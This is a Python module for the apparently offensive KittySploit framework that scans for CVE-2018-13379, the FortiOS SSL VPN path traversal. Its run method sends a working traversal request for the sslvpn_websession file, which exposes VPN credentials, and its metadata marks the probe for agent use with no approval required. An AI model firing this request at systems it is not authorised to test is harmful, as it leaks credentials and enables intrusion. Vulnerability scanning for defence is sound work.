#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Fortinet FortiOS 6."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Fortinet FortiOS - Credentials Disclosure Detection',
        'description': 'Fortinet FortiOS 6.0.0 to 6.0.4, 5.6.3 to 5.6.7 and 5.4.6 to 5.4.12 and FortiProxy 2.0.0, 1.2.0 to 1.2.8, 1.1.0 to 1.1.6, 1.0.0 to 1.0.7 under SSL VPN web portal allows an unauthenticated attacker to download system files via special crafted HTTP resource requests due to improper limitation of a pathname to a restricted directory (path traversal).',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2018', 'fortios', 'lfi', 'kev', 'fortinet', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://fortiguard.com/advisory/FG-IR-18-384',
            'https://www.fortiguard.com/psirt/FG-IR-20-233',
            'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-13379',
        ],
        'cve': 'CVE-2018-13379',
    }

    def run(self):
        r = self.http_request(method="GET", path='/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('^var fgt_lang =',)
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='critical',
                reason="Fortinet FortiOS - Credentials Disclosure detected",
                path='/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession',
            )
            return True
        return False

